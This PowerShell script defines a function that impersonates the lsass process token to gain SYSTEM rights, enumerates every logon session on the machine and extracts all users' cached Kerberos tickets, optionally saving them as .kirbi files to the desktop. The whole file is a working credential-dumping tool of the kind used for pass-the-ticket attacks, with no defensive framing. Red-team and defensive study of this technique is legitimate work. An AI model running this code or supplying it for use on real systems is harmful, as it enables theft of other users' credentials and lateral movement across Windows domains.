#list all cached tickets, and export them if you ask, to your desktop
Function kerberos-list($export=$false)
{
    $tickets = @"
    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public UInt32 LowPart;
        public Int32 HighPart;
    }

    [DllImport("secur32.dll", SetLastError=false)]
    public static extern int LsaConnectUntrusted([Out] out IntPtr LsaHandle);

    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_STRING_IN
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr buffer;
    }  

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaRegisterLogonProcess(LSA_STRING_IN LogonProcessName,out IntPtr LsaHandle,out ulong SecurityMode);

    [DllImport("secur32.dll", SetLastError=false)]
    public static extern int LsaLookupAuthenticationPackage([In] IntPtr LsaHandle,[In] ref LSA_STRING_IN PackageName,[Out] out UInt32 AuthenticationPackage);

    [DllImport("Secur32.dll", SetLastError = false)]
    public static extern int LsaEnumerateLogonSessions(out uint LogonSessionCount, out IntPtr LogonSessionList);

    [DllImport("secur32.dll", SetLastError=false)]
    public static extern int LsaFreeReturnBuffer([In] IntPtr buffer);

    public enum LogonType
    {
        UndefinedLogonType,
        Interactive,
        Network,
        Batch,
        Service,
        Proxy,
        Unlock,
        NetworkCleartext,
        NewCredentials,
        RemoteInteractive,
        CachedInteractive,
        CachedRemoteInteractive,
        CachedUnlock
    }

    public class LogonSessionData
    {
        public LUID LogonID;
        public string username;
        public string LogonDomain;
        public string AuthenticationPackage;
        public LogonType logonType;
        public int Session;
        public SecurityIdentifier Sid;
        public DateTime LogonTime;
        public string LogonServer;
        public string DnsDomainName;
        public string Upn;
    }

    public struct SECURITY_LOGON_SESSION_DATA
    {
        public UInt32 size;
        public LUID LogonID;
        public LSA_STRING_IN username;
        public LSA_STRING_IN LogonDomain;
        public LSA_STRING_IN AuthenticationPackage;
        public UInt32 logontype;
        public UInt32 Session;
        public IntPtr PSid;
        public UInt64 LogonTime;
        public LSA_STRING_IN LogonServer;
        public LSA_STRING_IN DnsDomainName;
        public LSA_STRING_IN Upn;
    }
     
    [DllImport("Secur32.dll", SetLastError = false)]
    public static extern uint LsaGetLogonSessionData(IntPtr luid, out IntPtr ppLogonSessionData);

    public enum KERB_PROTOCOL_MESSAGE_TYPE 
    {
      KerbDebugRequestMessage,
      KerbQueryTicketCacheMessage,
      KerbChangeMachinePasswordMessage,
      KerbVerifyPacMessage,
      KerbRetrieveTicketMessage,
      KerbUpdateAddressesMessage,
      KerbPurgeTicketCacheMessage,
      KerbChangePasswordMessage,
      KerbRetrieveEncodedTicketMessage,
      KerbDecryptDataMessage,
      KerbAddBindingCacheEntryMessage,
      KerbSetPasswordMessage,
      KerbSetPasswordExMessage,
      KerbVerifyCredentialMessage,
      KerbQueryTicketCacheExMessage,
      KerbPurgeTicketCacheExMessage,
      KerbRefreshSmartcardCredentialsMessage,
      KerbAddExtraCredentialsMessage,
      KerbQuerySupplementalCredentialsMessage,
      KerbTransferCredentialsMessage,
      KerbQueryTicketCacheEx2Message,
      KerbSubmitTicketMessage,
      KerbAddExtraCredentialsExMessage
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_QUERY_TKT_CACHE_REQUEST
    {
        public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
        public LUID LogonId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_TICKET_CACHE_INFO_EX
    {
        public UNICODE_STRING ClientName;
        public UNICODE_STRING ClientRealm;
        public UNICODE_STRING ServerName;
        public UNICODE_STRING ServerRealm;
        public long StartTime;
        public long EndTime;
        public long RenewTime;
        public uint EncryptionType;
        public uint TicketFlags;
    }

    [Flags]
    public enum TicketFlags : uint
    {
        name_canonicalize = 0x10000,
        forwardable = 0x40000000,
        forwarded = 0x20000000,
        hw_authent = 0x00100000,
        initial = 0x00400000,
        invalid = 0x01000000,
        may_postdate = 0x04000000,
        ok_as_delegate = 0x00040000,
        postdated = 0x02000000,
        pre_authent = 0x00200000,
        proxiable = 0x10000000,
        proxy = 0x08000000,
        renewable = 0x00800000,
        reserved = 0x80000000,
        reserved1 = 0x00000001
    }

    public enum EncTypes : uint
    {
        DES_CBC_CRC = 0x0001,
        DES_CBC_MD4 = 0x0002,
        DES_CBC_MD5 = 0x0003,
        DES_CBC_raw = 0x0004,
        DES3_CBC_raw = 0x0006,
        DES3_CBC_SHA_1 = 0x0010,
        AES128_CTS_HMAC_SHA1_96 = 0x0011,
        AES256_CTS_HMAC_SHA1_96 = 0x0012,
        AES128_cts_hmac_sha256_128 = 0x0013,
        AES256_cts_hmac_sha384_192 = 0x0014,
        RC4_HMAC_MD5 = 0x0017,
        RC4_HMAC_MD5_EXP = 0x0018
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_QUERY_TKT_CACHE_RESPONSE
    {
        public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
        public int CountOfTickets;
        public IntPtr Tickets;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_HANDLE
    {
        public IntPtr LowPart;
        public IntPtr HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_RETRIEVE_TKT_REQUEST
    {
        public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
        public LUID LogonId;
        public UNICODE_STRING TargetName;
        public uint TicketFlags;
        public uint CacheOptions;
        public int EncryptionType;
        public SECURITY_HANDLE CredentialsHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_CRYPTO_KEY
    {
        public int KeyType;
        public int Length;
        public IntPtr Value;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_EXTERNAL_TICKET
    { 
      public IntPtr ServiceName;
      public IntPtr TargetName;
      public IntPtr ClientName;
      public UNICODE_STRING      DomainName;
      public UNICODE_STRING      TargetDomainName;
      public UNICODE_STRING      AltTargetDomainName;
      public KERB_CRYPTO_KEY     SessionKey;
      public uint                TicketFlags;
      public uint                Flags;
      public long                KeyExpirationTime;
      public long                StartTime;
      public long                EndTime;
      public long                RenewUntil;
      public long                TimeSkew;
      public int                 EncodedTicketSize;
      public IntPtr              EncodedTicket;
    } 

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_RETRIEVE_TKT_RESPONSE
    {
        public KERB_EXTERNAL_TICKET Ticket;
    }
    
    [DllImport("Secur32.dll", SetLastError = true)]
    public static extern int LsaCallAuthenticationPackage(IntPtr LsaHandle,uint AuthenticationPackage,IntPtr ProtocolSubmitBuffer,int SubmitBufferLength,out IntPtr ProtocolReturnBuffer,out ulong ReturnBufferLength,out int ProtocolStatus);

    [DllImport("secur32.dll", SetLastError=false)]
    public static extern int LsaDeregisterLogonProcess([In] IntPtr LsaHandle);


    [DllImport("kernel32.dll", EntryPoint = "CopyMemory", SetLastError = false)]
    public static extern void CopyMemory(IntPtr dest, IntPtr src, uint count);
"@
    
    #Impersonating your current token to the Id of the process your specified(default is System)
    Function token-elevate($id=(Get-Process -Name lsass).Id)
    {
        $elevate = @"
        public enum SECURITY_IMPERSONATION_LEVEL 
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        public enum TOKEN_TYPE 
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        [DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes,SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType,out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError=true)] 
        [return: MarshalAs(UnmanagedType.Bool)] 
        public static extern bool SetThreadToken(IntPtr PHThread,IntPtr Token);
    
        [DllImport("advapi32.dll", SetLastError=true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle,UInt32 DesiredAccess, out IntPtr TokenHandle); 
"@

        
        Add-Type -MemberDefinition $elevate -Namespace "token" -Name "elevate"
    
        $TOKEN_IMPERSONATE = 4
        $TOKEN_DUPLICATE = 2
        $TOKEN_QUERY = 8

        #Open handle to the token of the process, duplicate it and set the current thread token to the one of the process.
        Function TokenImpersonate($id)
        {
            $process = Get-Process -Id $id
            $hToken = New-Object System.IntPtr
            [token.elevate]::OpenProcessToken($process.Handle,$TOKEN_IMPERSONATE -bor $TOKEN_DUPLICATE,[ref]$hToken)|Out-Null

            $DupToken = New-Object System.IntPtr
            [token.elevate]::DuplicateTokenEx($hToken,$TOKEN_QUERY -bor $TOKEN_IMPERSONATE,[intptr]::Zero,[token.elevate+SECURITY_IMPERSONATION_LEVEL]::SecurityImpersonation,[token.elevate+TOKEN_TYPE]::TokenImpersonation,[ref]$DupToken)|Out-Null
            [token.elevate]::SetThreadToken([IntPtr]::Zero,$DupToken)|Out-Null
        }

        $prid = (Get-Process -Name lsass).Id
        if($id -eq $prid){TokenImpersonate $prid}
        else{TokenImpersonate $prid ; TokenImpersonate $id}
    }


    #Check if you are running as admin
    Function RunningAsAdmin()
    {
        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $princ = New-Object System.Security.Principal.WindowsPrincipal($user)
        if($princ.IsInRole("Administrators")){return $true}
        else{return $false}
    }


    #returning the current luid
    Function GetCurrentLuid()
    {
        $output = klist
        return $output.split("`n")[1].split(":")[1]
    }


    #Get Lsa Handle to enumerate all users
    Function LsaRegisterLogonProcess()
    {
       $logonProcessName = "User32LogonProcess"
       $LSAString = new-object kerberos.list+LSA_STRING_IN
       $lsaHandle = New-Object System.IntPtr
       [System.UInt64]$SecurityMode = 0

       $LSAString.Length = [System.UInt16]$logonProcessName.Length
       $LSAString.MaximumLength = [System.UInt16]($logonProcessName.Length + 1)
       $LSAString.buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($logonProcessName)

       $ret = [kerberos.list]::LsaRegisterLogonProcess($LSAString,[ref]$lsaHandle,[ref]$SecurityMode)

       return $lsaHandle
    }


    #Get lsa handle based on your privileges
    Function GetLsaHandle()
    {
        $lsahandle = New-Object System.IntPtr
        if(!(RunningAsAdmin))
        {
            Write-Host "`n[x] You Are Not Running As Admin, so we will dump only your own tickets!" -ForegroundColor Red
            [int]$retcode = [kerberos.list]::LsaConnectUntrusted([ref]$lsahandle)
        }

        else
        {
            #token-elevate impoersonate you to be System
            if(!([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -match "SYSTEM")){token-elevate|Out-Null}
            $lsahandle = LsaRegisterLogonProcess
        }
        return $lsahandle
    }


    #Enumerate all the logon sessions on your pc
    Function EnumerateLogonSessions()
    {
        $luids = @()
        if(!(RunningAsAdmin))
        {
            $strLuid = GetCurrentLuid
            $intLuid = [convert]::ToInt32($strluid,16)
            $luid = New-Object kerberos.list+LUID
            $luid.LowPart = $intLuid
            $luids += $luid
        }

        else
        {
           $count = New-Object System.Int32
           $luidptr = New-Object System.IntPtr 
           $ret = [kerberos.list]::LsaEnumerateLogonSessions([ref]$count,[ref]$luidptr)
           if($ret -ne 0){Write-Host "`n[x] Failed To enumerate Logon Sessions" -ForegroundColor Red}
           else
           {
                $Luidtype = New-Object kerberos.list+LUID
                $Luidtype = $Luidtype.GetType()
                for($i = 0; $i -lt [int32]$count;$i++)
                {
                    $luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($luidptr,[type]$Luidtype)
                    $luids += $luid
                    [System.IntPtr]$luidptr = $luidptr.ToInt64() + [System.Runtime.InteropServices.Marshal]::SizeOf([type]$Luidtype)
                }
                [kerberos.list]::LsaFreeReturnBuffer($luidptr)
           }
        }
        return $luids
    }


    #Get information about session data based on logon id
    Function GetLogonSessionData($luid)
    {
        $luidptr = New-Object System.IntPtr
        $sessionDataPtr = New-Object System.IntPtr

        try
        {
            $luidptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($luid))
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($luid,$luidptr,$false)

            $ret = [kerberos.list]::LsaGetLogonSessionData($luidptr,[ref]$sessionDataPtr)
            if($ret -eq 0)
            {
                $type = New-Object kerberos.list+SECURITY_LOGON_SESSION_DATA
                $type = $type.GetType()
                [kerberos.list+SECURITY_LOGON_SESSION_DATA]$unsafeData = [System.Runtime.InteropServices.Marshal]::PtrToStructure($sessionDataPtr,[type]$type)
                $logonSessionData = New-Object kerberos.list+LogonSessionData
            
                $logonSessionData.AuthenticationPackage = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.AuthenticationPackage.Buffer, $unsafeData.AuthenticationPackage.Length / 2)
                $logonSessionData.DnsDomainName = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.DnsDomainName.Buffer, $unsafeData.DnsDomainName.Length / 2)
                $logonSessionData.LogonID = $unsafeData.LogonID
                $logonSessionData.LogonTime = [System.DateTime]::FromFileTime($unsafeData.LogonTime)
                $logonSessionData.LogonServer = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.LogonServer.Buffer,$unsafeData.LogonServer.Length / 2)
                [kerberos.list+LogonType]$logonSessionData.LogonType = $unsafeData.LogonType
                $logonSessionData.Sid = New-Object System.Security.Principal.SecurityIdentifier($unsafeData.PSid)
                $logonSessionData.Upn = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.Upn.Buffer,$unsafeData.Upn.Length /2)
                $logonSessionData.Session = [int]$unsafeData.Session
                $logonSessionData.username = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.username.Buffer,$unsafeData.username.Length /2)
                $logonSessionData.LogonDomain = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.LogonDomain.buffer,$unsafeData.LogonDomain.Length /2)
            }
        }

        finally
        {
            if($sessionDataPtr -ne [System.IntPtr]::Zero){[kerberos.list]::LsaFreeReturnBuffer($sessionDataPtr)|Out-Null}
            if($luidptr -ne [System.IntPtr]::Zero){[kerberos.list]::LsaFreeReturnBuffer($luidptr)|Out-Null}
        }
    
        return $logonSessionData
    }


    #Recieve logon id and service name, and extract the ticket to a file 
    Function ExtractTicket([intptr]$lsaHandle,[int]$authPackage,[kerberos.list+LUID]$luid=(New-Object kerberos.list+LUID),[string]$targetname,[System.UInt32]$ticketFlags = 0,$ticket,[bool]$export)
    {
        $responsePointer = [System.IntPtr]::Zero
        $request = New-Object kerberos.list+KERB_RETRIEVE_TKT_REQUEST
        $requestType = $request.GetType()
        $response = New-Object kerberos.list+KERB_RETRIEVE_TKT_RESPONSE
        $responseType = $response.GetType()
        $returnBufferLength = 0
        $protocolStatus = 0

        $request.MessageType = [kerberos.list+KERB_PROTOCOL_MESSAGE_TYPE]::KerbRetrieveEncodedTicketMessage
        $request.LogonId = $luid
        $request.TicketFlags = 0x0
        $request.CacheOptions = 0x8
        $request.EncryptionType = 0x0

        $tname = New-Object kerberos.list+UNICODE_STRING
        $tname.Length = [System.UInt16]($targetname.Length * 2)
        $tname.MaximumLength = [System.UInt16](($tname.Length) + 2)
        $tname.buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($targetname)
    
        $request.TargetName = $tname

        $structSize = [System.Runtime.InteropServices.Marshal]::SizeOf([type]$requestType)
        $newStructSize = $structSize + $tname.MaximumLength
        $unmanagedAddr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($newStructSize)

        [System.Runtime.InteropServices.Marshal]::StructureToPtr($request,$unmanagedAddr,$false)

        $newTargetNameBuffPtr = [System.IntPtr]([System.Int64]($unmanagedAddr.ToInt64() + [System.Int64]$structSize))

        [kerberos.list]::CopyMemory($newTargetNameBuffPtr,$tname.buffer,$tname.MaximumLength) 
        if([System.IntPtr]::Size -eq 8){$size = 24}
        else{$size = 16}
        [System.Runtime.InteropServices.Marshal]::WriteIntPtr($unmanagedAddr,$size,$newTargetNameBuffPtr)
    
        $retcode = [kerberos.list]::LsaCallAuthenticationPackage($lsaHandle,$authPackage,$unmanagedAddr,$newStructSize,[ref]$responsePointer,[ref]$returnBufferLength,[ref]$protocolStatus)
    
        if(($retcode -eq 0) -and ($returnBufferLength -ne 0))
        {
            $response = [System.Runtime.InteropServices.Marshal]::PtrToStructure($responsePointer,[type]$responseType)
        
            $encodedTicketSize = $response.Ticket.EncodedTicketSize

            $encodedTicket = [System.Array]::CreateInstance([byte],$encodedTicketSize)
            [System.Runtime.InteropServices.Marshal]::Copy($response.Ticket.EncodedTicket,$encodedTicket,0,$encodedTicketSize)
        }

        [kerberos.list]::LsaFreeReturnBuffer($responsePointer)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($unmanagedAddr)

        #Saving All Tickets in Folder
        if($export)
        {
            $path = "$env:USERPROFILE\Desktop\Tickets"
            if(!(Test-Path $path)){New-Item -ItemType directory -Path $path}
            if($null -ne $ticket.LogonSession.username)
            {
                $fileName = $ticket.LogonSession.username + "@" + $targetname.Split("/")[0] + "-" + $ticket.ServerRealm + ".kirbi"
                if($null -ne $encodedTicket){[System.IO.File]::WriteAllBytes("$path\$fileName",$encodedTicket)}
            }
        }

        return $response.Ticket.SessionKey.KeyType
    }


    #Display all the information about the tickets
    Function DisplaySessionCreds($sessioncreds)
    {
        foreach($sessioncred in $sessioncreds)
        {
            if((@($sessioncred).Count -gt 0) -and ($sessioncred[0].LogonSession[0].LogonID.LowPart -ne "0") )
            {
                $print_object = New-Object psobject
                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "UserName" -Value $sessioncred[0].LogonSession.username
                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "Domain" -Value $sessioncred[0].LogonSession.LogonDomain
                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "LogonId" -Value ("0x{0:x}" -f $sessioncred[0].LogonSession.LogonId.LowPart)
                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "UserSid" -Value $sessioncred[0].LogonSession.Sid
                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "AuthenticationPackage" -Value $sessioncred[0].LogonSession.AuthenticationPackage
                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "LogonType" -Value $sessioncred[0].LogonSession.logonType
                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "LogonTime" -Value $sessioncred[0].LogonSession.logonTime
                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "LogonServerDnsDomain" -Value $sessioncred[0].LogonSession.DnsDomainName
                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "UserPrincipalName" -Value $sessioncred[0].LogonSession.Upn

                Write-Host "------------------------------------------------------------------------------------------------------------------"
                $print_object
                Write-Host "[*]Enumerated " @($sessioncred).Count "tickets`n" -ForegroundColor Green
                foreach($ticket in $sessioncred)
                {
                    Write-Host "    Service Name       : " $ticket.ServerName
                    Write-Host "    EncryptionType     : " ([kerberos.list+EncTypes]$ticket.EncryptionType)
                    Write-Host "    Start/End/MaxRenew : " $ticket.StartTime ";" $ticket.EndTime ";" $ticket.RenewTime
                    Write-Host "    Server Name        : " $ticket.ServerName.split("/")[1] "@" $ticket.ServerRealm
                    Write-Host "    Client Name        : " $ticket.ClientName "@" $ticket.ClientRealm
                    Write-Host "    Flags              : " $ticket.TicketFlags
                    if($ticket.SessionKeyType){Write-Host "    Session Key Type   : " $ticket.SessionKeyType "`n"}
                }
                Write-Host "--------------------------------------------------------------------------------------------------------------------------------"
                Write-Host "`n`n"
            }
        }
    }
    

    #From here start the main function 
    $assemblies = [System.Reflection.Assembly]::LoadWithPartialName("System.Security.Principal")
    Add-Type -MemberDefinition $tickets -Namespace "kerberos" -Name "list" -ReferencedAssemblies $assemblies.location -UsingNamespace System.Security.Principal

    $retcode = New-Object System.Int32
    $authPackage = New-Object System.Int32
    $name = "kerberos"


    $LSAString = New-Object kerberos.list+LSA_STRING_IN
    $LSAString.Length = [uint16]$name.Length
    $LSAString.MaximumLength = [uint16]($name.Length + 1)
    $LSAString.buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($name)

    $lsaHandle = GetLsaHandle

    $retcode = [kerberos.list]::LsaLookupAuthenticationPackage($lsaHandle,[ref]$LSAString,[ref]$authPackage)
    $sessioncreds = @()

    foreach($luid in EnumerateLogonSessions)
    {
        $logonSessionData = New-Object kerberos.list+LogonSessionData
        try{$logonSessionData = GetLogonSessionData($luid)}
        catch{continue}
    
        $sessioncred = @()

        $ticketsPointer = New-Object System.IntPtr
        $returnBufferLength = 0
        $protocolStatus = 0

        $ticketCacheRequest = New-Object kerberos.list+KERB_QUERY_TKT_CACHE_REQUEST
        $ticketCacheRespone = New-Object kerberos.list+KERB_QUERY_TKT_CACHE_RESPONSE
        $ticketCacheResponeType = $ticketCacheRespone.GetType()
        $ticketCacheResult = New-Object kerberos.list+KERB_TICKET_CACHE_INFO_EX

        $ticketCacheRequest.MessageType = [kerberos.list+KERB_PROTOCOL_MESSAGE_TYPE]::KerbQueryTicketCacheExMessage
        if(RunningAsAdmin){$ticketCacheRequest.LogonId = $logonSessionData.LogonID}
        else{$ticketCacheRequest.LogonId = New-Object kerberos.list+LUID}
    
        $tQueryPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($ticketCacheRequest))
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($ticketCacheRequest,$tQueryPtr,$false)

        $retcode = [kerberos.list]::LsaCallAuthenticationPackage($lsaHandle,$authPackage,$tQueryPtr,[System.Runtime.InteropServices.Marshal]::SizeOf($ticketCacheRequest),[ref]$ticketsPointer,[ref]$returnBufferLength,[ref]$protocolStatus)
        if(($retcode -eq 0) -and ($ticketsPointer -ne [System.IntPtr]::Zero))
        {
            [kerberos.list+KERB_QUERY_TKT_CACHE_RESPONSE]$ticketCacheRespone = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ticketsPointer,[type]$ticketCacheResponeType)
            $count2 = $ticketCacheRespone.CountOfTickets
            if($count2 -ne 0)
            {
                $cacheInfoType = $ticketCacheResult.GetType()
                $dataSize = [System.Runtime.InteropServices.Marshal]::SizeOf([type]$cacheInfoType)
                for($j = 0;$j -lt $count2;$j++)
                {
                    [System.IntPtr]$currTicketPtr = [int64]($ticketsPointer.ToInt64() + [int](8 + $j * $dataSize))
                    [kerberos.list+KERB_TICKET_CACHE_INFO_EX]$ticketCacheResult = [System.Runtime.InteropServices.Marshal]::PtrToStructure($currTicketPtr,[type]$cacheInfoType)

                    $ticket = New-Object psobject
                    Add-Member -InputObject $ticket -MemberType NoteProperty -name "StartTime" -value  ([datetime]::FromFileTime($ticketCacheResult.StartTime))
                    Add-Member -InputObject $ticket -MemberType NoteProperty -name "EndTime" -value  ([datetime]::FromFileTime($ticketCacheResult.EndTime))
                    Add-Member -InputObject $ticket -MemberType NoteProperty -name  "RenewTime" -value ([datetime]::FromFileTime($ticketCacheResult.RenewTime))
                    Add-Member -InputObject $ticket -MemberType NoteProperty -Name "TicketFlags" -Value ([kerberos.list+TicketFlags]$ticketCacheResult.TicketFlags)
                    Add-Member -InputObject $ticket -MemberType NoteProperty -Name "EncryptionType" -Value $ticketCacheResult.EncryptionType
                    Add-Member -InputObject $ticket -MemberType NoteProperty -name  "ServerName" -value  ([System.Runtime.InteropServices.Marshal]::PtrToStringUni($ticketCacheResult.ServerName.Buffer,$ticketCacheResult.ServerName.Length / 2))
                    Add-Member -InputObject $ticket -MemberType NoteProperty -name  "ServerRealm" -value ([System.Runtime.InteropServices.Marshal]::PtrToStringUni($ticketCacheResult.ServerRealm.Buffer,$ticketCacheResult.ServerRealm.Length / 2))
                    Add-Member -InputObject $ticket -MemberType NoteProperty -name  "ClientName" -value ([System.Runtime.InteropServices.Marshal]::PtrToStringUni($ticketCacheResult.ClientName.Buffer,$ticketCacheResult.ClientName.Length / 2))
                    Add-Member -InputObject $ticket -MemberType NoteProperty -name "ClientRealm" -value ([System.Runtime.InteropServices.Marshal]::PtrToStringUni($ticketCacheResult.ClientRealm.Buffer,$ticketCacheResult.ClientRealm.Length / 2))
                    Add-Member -InputObject $ticket -MemberType NoteProperty -Name "LogonSession" -Value $logonSessionData
                
                    $SessionEncType = (ExtractTicket $lsaHandle $authPackage $ticketCacheRequest.LogonId $ticket.ServerName $ticketCacheResult.TicketFlags $ticket $export)[1]

                    try
                    {
                        if($SessionEncType -ne 0 ){Add-Member -InputObject $ticket -MemberType NoteProperty -Name "SessionKeyType" -Value ([kerberos.list+EncTypes]$SessionEncType)}
                    }
                    catch{}

                    $sessioncred += $ticket
                }
            }
        }

        [kerberos.list]::LsaFreeReturnBuffer($ticketsPointer)|Out-Null
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($tQueryPtr)
        $sessioncreds += @(,$sessioncred)
    }

    [kerberos.list]::LsaDeregisterLogonProcess($lsaHandle)|Out-Null
    DisplaySessionCreds $sessioncreds

    if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -match "SYSTEM"){[token.elevate]::SetThreadToken([System.IntPtr]::Zero,[System.IntPtr]::Zero)|Out-Null}
}


